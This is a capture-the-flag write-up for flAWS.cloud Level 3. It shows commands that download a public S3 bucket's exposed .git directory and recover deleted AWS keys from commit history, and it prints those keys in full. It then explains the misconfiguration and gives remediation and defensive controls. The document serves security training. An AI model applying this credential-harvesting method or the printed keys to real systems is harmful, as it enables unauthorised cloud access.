flAWS.cloud - Level 3: Git History Exposure in S3

Date: 2026-06-20

Objective: Exploit a public S3 bucket containing an exposed .git directory to recover deleted AWS credentials from repository history.



What Changed from Previous Levels

| Level       | Bucket              | Vulnerability                                   | Key Lesson                                |
| ----------- | ------------------- | ----------------------------------------------- | ----------------------------------------- |
| **Level 1** | `flaws.cloud`       | Fully public, anonymous access                  | Public S3 buckets expose data to everyone |
| **Level 2** | `level2-c8b217a...` | Authenticated access for any AWS account        | Misconfigured IAM/resource policies       |
| **Level 3** | `level3-9afd392...` | Public `.git` directory with credential history | Deleted secrets persist in Git history    |



Commands Used (Ubuntu/WSL)

# Verify AWS CLI
aws --version

# Download the entire S3 bucket (includes .git directory)
aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . \
    --no-sign-request --region us-west-2

# Inspect the Git repository
git log

# View commit history details
git log --name-only

# Recover deleted credentials from first commit
git show f52ec03b227ea6094b04e43f475fb0126edb5a61:access_keys.txt









**Git Commit History Discovered**

 commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -> master)
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:43 2017 -0600

    Oops, accidentally added something I shouldn't have

access_keys.txt

commit f52ec03b227ea6094b04e43f475fb0126edb5a61
Author: 0xdabbad00 <scott@summitroute.com>
Date:   Sun Sep 17 09:10:07 2017 -0600

    first commit

access_keys.txt

authenticated_users.png

hint1.html

hint2.html

hint3.html

hint4.html

index.html

robots.txt         



**Credentials Recovered from Git History**

git show f52ec03b227ea6094b04e43f475fb0126edb5a61:access_keys.txt



**Output:**

access_key AKIAJ366LIPB4IJKT7SA
secret_access_key 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


| Key                   | Value                                      |
| --------------------- | ------------------------------------------ |
| **Access Key ID**     | `AKIAJ366LIPB4IJKT7SA`                     |
| **Secret Access Key** | `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` |




**The Vulnerability Explained**

**The Misconfiguration:**
A public S3 bucket hosted a static website that included the entire .git directory. This is equivalent to exposing your source code repository.

The Deeper Issue:
The developer attempted to "remove" sensitive credentials by deleting access_keys.txt in a subsequent commit. However, deleting a file in Git does not remove it from history. Anyone with access to the .git folder can recover every version of every file ever committed.



**Why This Happens:**

| Mistake                                     | Consequence                          |
| ------------------------------------------- | ------------------------------------ |
| Uploading `.git` to public web root         | Exposes complete repository history  |
| `git rm` without `git filter-branch` or BFG | File remains in previous commits     |
| Hardcoding credentials in code              | Credentials exist in history forever |
| No `.gitignore` for sensitive files         | Accidental commits of secrets        |




**Proper Remediation**
If you accidentally commit secrets:

1. Revoke the credentials immediately — rotating keys is the only true fix
2. Use BFG Repo-Cleaner or git-filter-repo to purge history:

# Install git-filter-repo
pip install git-filter-repo

# Remove file from entire history
git filter-repo --path access_keys.txt --invert-paths

3. Force push to overwrite remote history (coordinate with team):
   git push origin --force --all

4. Never rely on deletion alone — assume committed secrets are compromised




**Defensive Measures**

| Layer              | Control                | Implementation                                           |
| ------------------ | ---------------------- | -------------------------------------------------------- |
| **Pre-commit**     | Git hooks              | Block commits containing patterns like `AKIA` (AWS keys) |
| **Repository**     | `.gitignore`           | Exclude `.env`, `config.json`, credential files          |
| **CI/CD**          | Secret scanning        | GitHub Advanced Security, GitLeaks, TruffleHog           |
| **Infrastructure** | S3 Block Public Access | Prevent `.git` exposure at the bucket level              |
| **Credentials**    | IAM best practices     | Use IAM roles, never long-term access keys in code       |




**Tools Used**

| Tool       | Version  | Purpose                       |
| ---------- | -------- | ----------------------------- |
| AWS CLI    | v2.31.35 | S3 bucket sync                |
| Git        | Latest   | Repository history inspection |
| Ubuntu/WSL | 26.04    | Linux environment for lab     |




**Key Takeaways**
1. Git history is forever — git rm only removes from the working tree
2. .Never expose .git on public servers — it's a complete backup of your code
3. Rotate credentials immediately if exposed — history removal is cleanup, not protection
4. Use secret scanning tools (GitLeaks, TruffleHog, GitHub secret scanning) in CI/CD
5. S3 static hosting + Git repos = danger — always verify what's being served




**Progress Tracker**

| Level   | Status     | Key Takeaway                                       |
| ------- | ---------- | -------------------------------------------------- |
| Level 1 | ✅ Complete | Public S3 buckets expose data to everyone          |
| Level 2 | ✅ Complete | Authenticated-but-unrestricted access is dangerous |
| Level 3 | ✅ Complete | Git history retains deleted secrets forever        |
| Level 4 | ⬜ Next     | Use recovered credentials to proceed               |



Status: ✅ Completed

Next Challenge: Level 4 (use recovered AWS credentials)
















